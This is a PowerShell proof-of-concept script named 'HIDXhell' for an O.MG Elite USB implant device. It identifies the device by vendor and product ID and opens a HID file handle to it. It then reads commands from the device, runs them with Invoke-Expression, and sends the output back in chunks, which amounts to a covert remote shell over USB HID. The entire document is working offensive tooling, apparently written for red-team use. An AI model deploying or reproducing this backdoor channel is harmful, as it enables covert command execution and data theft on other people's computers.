<#
win-hidshell.ps1
Authors:  Wasabi (@spiceywasabi), [REDACTED] (@01p8or13)
Acknowledgements: rogandawes
Required Dependencies: Activated HIDX on OMG Elite device
#>

function HIDXhell {
<#
.DESCRIPTION
This powershell script is a PoC for a bidirectional, shell-like connection between a host and an O.MG Elite device.
Best usage with listener: https://github.com/O-MG/O.MG-Firmware/blob/beta/tools/HIDX/python/universal-hidxcli.py

.PARAMETER VendorID
Defining vendor ID of the device. (Default: D3C0)

.PARAMETER ProductID
Defining product ID of the device. (Default: D34D)

.PARAMETER Verbose
Display received commands in chunks

.EXAMPLE
HIDXhell usage with defined device: 
HIDXhell -VendorID D3C0 -ProductID D34D

.LINK
https://github.com/0iphor13
https://github.com/spiceywasabi
https://github.com/rogandawes

#Credits to Rogan for idea of filehandle and device identification
#>

[cmdletbinding()]
param(
   [Parameter(Position = 1)]
        [ValidateNotNullOrEmpty()]
        [String]
        $VendorID = "D3C0", #Default value

    [Parameter(Position = 2)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ProductID = "D34D" # Default value
        )

#Defining OMG device
$OMG = $VendorID +"&PID_" + $ProductID

$text = ""
$tries = 0 
$ErrorActionPreference="Stop"

#Creating filehandle
function CreateBinding(){
   try { 
        Add-Type -TypeDefinition @"
using System;
using System.IO;
using Microsoft.Win32.SafeHandles;
using System.Runtime.InteropServices;
namespace omg {
    public class hidx {
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern SafeFileHandle CreateFile(String fn, UInt32 da, Int32 sm, IntPtr sa, Int32 cd, uint fa, IntPtr tf);

        public static FileStream open(string fn) {
            return new FileStream(CreateFile(fn, 0XC0000000U, 3, IntPtr.Zero, 3, 0x40000000, IntPtr.Zero), FileAccess.ReadWrite, 3, true);
        }
    }
}
"@
        write-host -ForegroundColor Yellow "[?]Adding Binding..."
        } 
        catch {
            Write-Host -ForegroundColor red "[!]Error:Cannot load Binding..."
        }
}

function Get-OMGDevice(){
    #Identify OMG device
    $devs = gwmi Win32_USBControllerDevice
    write-host -ForegroundColor Yellow "[?]Searching for O.MG Device..."
    $devicestring=$null
    foreach ($dev in $devs) {
        $wmidev = [wmi]$dev.Dependent
        if ($wmidev.GetPropertyValue('DeviceID') -match ($OMG) -and ($null -eq $wmidev.GetPropertyValue('Service'))) {
            $devicestring = ([char]92+[char]92+'?'+[char]92 + $wmidev.GetPropertyValue('DeviceID').ToString().Replace([char]92,[char]35) + [char]35+'{4d1e55b2-f16f-11cf-88cb-001111000030}')
        }
    }
    return $devicestring
}

$loop=$true
CreateBinding
while ($loop) {
    try {
            #Find O.MG device
            $devicestring = Get-OMGDevice
            #Verify device - error checking
            if($null -eq $devicestring){
                $loop=$false
                Write-Host -ForegroundColor red "[!]Error: No O.MG Device not found! Check VID/PID"
                $loop=$false
                break
            }
            #Verify device - open device
            Write-Host -ForegroundColor Green "[+]Identified O.MG Device: ${devicestring}"
            $filehandle = [omg.hidx]::open($devicestring)
            #Verify filehandle 
            if($null -eq $filehandle){
                $loop=$false
                Write-Host -ForegroundColor red "[!]Error: Filehandle is empty"
                break
            }
            $in = ""
            Do {
                Write-Host -ForegroundColor Green "[+]Ready to receive commands..."
                echo $filehandle.Length
                echo $filehandle.BytesToRead
                $byte = [byte[]]::new(10)
                #Read bytes from omg
                $bytes = New-Object Byte[] (65)
                $filehandle.Read($bytes, 0, 65) | Out-Null
                #Split and display received command
                foreach ($byte in $bytes) {
                    $input_raw = [System.Convert]::ToChar($byte)
                    if (($input_raw -ge 32 -and $input_raw -le 126) -or $input_raw -eq 10) {
                        $in = "${in}${input_raw}"
                        #If using verbose, display split commands
                        if ($VerbosePreference -eq 'Continue') {
                        Write-Host "Command Parts: ${byte} / $in"
                        }

                    }
                }
            #Execute on new-line
            } While (!$in.Contains("`n"))
            Write-Host -ForegroundColor Green "[+]Executed command: $in"
            $in | Format-Hex
            $output = Invoke-Expression $in|Out-String
            #Convert output to bytes
            $outputBytes = [System.Text.Encoding]::ASCII.GetBytes($output)
            $outputLength = $outputBytes.Length

            #Send output bytes to omg
            $outputChunkSize = 1 # Kept small for best experience
            $outputChunkNr = [Math]::Ceiling($outputLength / $outputChunkSize)

            $outputBytesToSend = New-Object Byte[] (65)

            for ($i = 0; $i -lt $outputChunkNr; $i++) {
                $outputStart = $i * $outputChunkSize
                $outputEnd = [Math]::Min(($i + 1) * $outputChunkSize, $outputLength)
                $outputChunkLen = $outputEnd - $outputStart
                $outputChunk = New-Object Byte[] $outputChunkLen
                [System.Buffer]::BlockCopy($outputBytes, $outputStart, $outputChunk, 0, $outputChunkLen) # Copy the output to the chunk
                $outputBytesToSend[1] = $outputChunkLen
                [System.Buffer]::BlockCopy($outputChunk, 0, $outputBytesToSend, 2, $outputChunkLen) # Copy the chunk to the packet
                $filehandle.Write($outputBytesToSend, 0, 65)
            }

        $filehandle.Close()
    }
    catch {
        Write-Host -ForegroundColor red "[!]Error occurred, ${tries} remain"
        echo $Error
        if($tries -le 0){
            $loop=$false
            $filehandle.Close()
            break
        } else {
            $tries = $tries - 1
        }
    }
}
}
